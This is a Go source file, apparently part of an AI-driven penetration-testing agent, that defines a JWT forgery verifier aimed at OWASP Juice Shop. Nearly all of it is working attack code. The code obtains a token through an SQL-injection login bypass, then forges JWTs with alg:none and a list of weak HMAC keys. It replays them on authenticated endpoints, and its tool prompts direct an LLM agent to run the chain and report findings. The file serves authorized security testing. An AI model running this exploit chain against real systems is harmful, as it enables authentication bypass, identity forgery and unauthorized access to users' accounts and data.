package agent

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	actool "artemis/engine/tool"
)

// Deterministic verifier for JWT forgery (Juice Shop V04, OWASP A02/A07): a server
// that does not verify the signature accepts a token signed with alg:none or with a
// weak/empty HMAC key, letting an attacker forge any identity. This is the classic
// "depth" class a weak 30B never actually pulls off — it stops at "the token looks
// weak". The tool does the chain in code: obtain a valid token, re-forge it, replay
// it on an auth-gated endpoint, and confirm ONLY when the forged token is accepted
// where no token is not.
//
// Generic: it mines a token via the login tautology (reusing the injection sweep),
// forges with standard techniques, and tests conventional authenticated endpoints.
// Nothing target-specific is hardcoded.

// jwtProtectedPaths are conventional endpoints that typically require auth, used as
// the acceptance oracle (a forged token accepted here == signature not verified).
var jwtProtectedPaths = []string{"/rest/user/whoami", "/rest/basket", "/api/Users", "/rest/order-history"}

// jwtWeakKeys are the empty/weak HMAC secrets to try for the HS256 forgery.
var jwtWeakKeys = []string{"", "secret", "password", "key", "jwt"}

func b64urlRaw(b []byte) string { return base64.RawURLEncoding.EncodeToString(b) }

// forgeJWTs returns forged variants of a valid token (payload kept intact): one
// alg:none token and one HS256 token per weak key. Returns pairs of (label, token).
func forgeJWTs(orig string) [][2]string {
	parts := strings.Split(strings.TrimSpace(orig), ".")
	if len(parts) < 2 || parts[1] == "" {
		return nil
	}
	payload := parts[1]
	var out [][2]string
	// alg:none (with and without trailing dot — servers differ)
	noneHdr := b64urlRaw([]byte(`{"alg":"none","typ":"JWT"}`))
	out = append(out, [2]string{"alg:none", noneHdr + "." + payload + "."})
	out = append(out, [2]string{"alg:none (no trailing dot)", noneHdr + "." + payload})
	// HS256 signed with weak/empty keys
	hsHdr := b64urlRaw([]byte(`{"alg":"HS256","typ":"JWT"}`))
	signing := hsHdr + "." + payload
	for _, k := range jwtWeakKeys {
		mac := hmac.New(sha256.New, []byte(k))
		mac.Write([]byte(signing))
		sig := b64urlRaw(mac.Sum(nil))
		label := fmt.Sprintf("HS256 weak key %q", k)
		out = append(out, [2]string{label, signing + "." + sig})
	}
	return out
}

// getBodyAuth GETs a URL presenting the token both as a Bearer header and a token
// cookie (apps vary), returning status and body.
func getBodyAuth(ctx context.Context, client *http.Client, u, token string) (int, string, bool) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return 0, "", false
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Cookie", "token="+token)
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", false
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, exposureBodyCap))
	return resp.StatusCode, string(b), true
}

// mineValidToken logs in via the auth-bypass tautology and extracts a JWT from the
// response (Authorization semantics vary; a JWT in the body is the reliable signal).
func mineValidToken(ctx context.Context, client *http.Client, root string) string {
	rnd := fmt.Sprint(time.Now().UnixNano())
	for _, lp := range loginPaths {
		if ctx.Err() != nil {
			return ""
		}
		_, body, ok := postJSON(ctx, client, root+lp, map[string]any{credFields[0]: sqlAuthBypassPayloads[0], passFields[0]: "x_" + rnd})
		if !ok {
			continue
		}
		if tok := jwtRe.FindString(body); tok != "" {
			return tok
		}
	}
	return ""
}

func (t *ToolSet) jwtVerify() actool.CoreTool {
	schema := map[string]any{
		"type": "object",
		"properties": map[string]any{
			"url": map[string]any{
				"type":        "string",
				"description": "Base URL of the target, e.g. http://host:3000. The verifier mines a valid token (login tautology), forges it, and replays it on common authenticated endpoints.",
			},
			"token": map[string]any{
				"type":        "string",
				"description": "Optional valid JWT to forge from. If omitted, the verifier obtains one itself via the login tautology.",
			},
		},
		"required": []any{"url"},
	}
	desc := "Deterministically CONFIRM or REFUTE JWT forgery (signature not verified). Obtains a valid token, re-forges it with alg:none and with weak/empty HMAC keys, and replays each on auth-gated endpoints: a forged token ACCEPTED where no token is rejected proves the signature is not verified (forge any identity). Use this instead of eyeballing a token's header. Pass the base URL (and optionally a valid token)."
	return readTool("jwt_verify", desc, schema, func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
		var a struct {
			URL   string `json:"url"`
			Token string `json:"token"`
		}
		_ = json.Unmarshal(in, &a)
		raw := strings.TrimSpace(a.URL)
		if raw == "" {
			return actool.Errorf("url is required: pass the target base URL, e.g. http://host:3000"), nil
		}
		base, err := url.Parse(raw)
		if err != nil || base.Host == "" {
			return actool.Errorf("jwt_verify needs an absolute URL (scheme://host[:port]), got: " + clipXSS(raw, 120)), nil
		}
		root := base.Scheme + "://" + base.Host
		client := &http.Client{Timeout: 8 * time.Second, CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse }}
		runCtx, cancel := context.WithTimeout(ctx, 60*time.Second)
		defer cancel()

		valid := strings.TrimSpace(a.Token)
		if valid == "" {
			valid = mineValidToken(runCtx, client, root)
		}
		if valid == "" {
			return actool.Text(
				"JWT forgery not tested: could not obtain a valid token (no login tautology produced a JWT, and none was " +
					"supplied). record_fact that a baseline token could not be mined; this is not a negative on forgery itself."), nil
		}
		forged := forgeJWTs(valid)
		if len(forged) == 0 {
			return actool.Errorf("jwt_verify: the obtained token is not a well-formed JWT (need header.payload.signature)"), nil
		}

		for _, p := range jwtProtectedPaths {
			if runCtx.Err() != nil {
				break
			}
			u := root + p
			_, noBody, ok := getBody(runCtx, client, u)
			if !ok {
				continue
			}
			vStatus, vBody, ok := getBodyAuth(runCtx, client, u, valid)
			if !ok {
				continue
			}
			// endpoint is a usable oracle only if a valid token UNLOCKS it: 2xx and a
			// materially different (larger) authenticated body than no-token.
			authGated := vStatus >= 200 && vStatus < 300 && vBody != noBody && len(vBody) > len(noBody)
			if !authGated {
				continue
			}
			for _, f := range forged {
				if runCtx.Err() != nil {
					break
				}
				fStatus, fBody, ok := getBodyAuth(runCtx, client, u, f[1])
				if !ok {
					continue
				}
				// forged ACCEPTED: 2xx and it got the authenticated view (differs from
				// no-token), i.e. the server honored a token it should have rejected.
				if fStatus >= 200 && fStatus < 300 && fBody != noBody && len(fBody) >= len(vBody)/2 {
					return actool.Text(fmt.Sprintf(
						"CONFIRMED JWT forgery at %s: a token forged with %s was ACCEPTED (HTTP %d, authenticated response) "+
							"while no token is rejected, so the server does NOT verify the signature and any identity can be "+
							"forged. report_finding (JWT forgery / broken auth, critical) with the forged token and this request "+
							"as reproduction. Do NOT record this as a negative.", p, f[0], fStatus)), nil
				}
			}
		}
		return actool.Text(fmt.Sprintf(
			"No JWT forgery: obtained a valid token and tried alg:none and %d weak-key HS256 forgeries against %d "+
				"auth-gated endpoints; none was accepted where no token is rejected (the server appears to verify the "+
				"signature). record_fact the negative; do NOT report_finding.", len(jwtWeakKeys), len(jwtProtectedPaths))), nil
	})
}

// jwtSummaries / intent: fire on the base URL alone. Text contains "JWT" so
// intentClass canonicalizes to "jwt".
func jwtSummaries(s Surface, _ int) []string {
	if strings.TrimSpace(s.Base) == "" {
		return nil
	}
	return []string{jwtIntentSummary(s.Base)}
}

func jwtIntentSummary(base string) string {
	return fmt.Sprintf(
		"JWT forgery check: call jwt_verify with the base URL %s to confirm or refute that the server fails to verify JWT "+
			"signatures. The verifier mines a valid token, re-forges it (alg:none and weak-key HS256) and replays it on "+
			"auth-gated endpoints; it confirms only if a forged token is accepted where no token is rejected. If CONFIRMED, "+
			"report_finding (JWT forgery, critical) with the forged token. If not, record_fact the negative and do NOT "+
			"report_finding.",
		base)
}
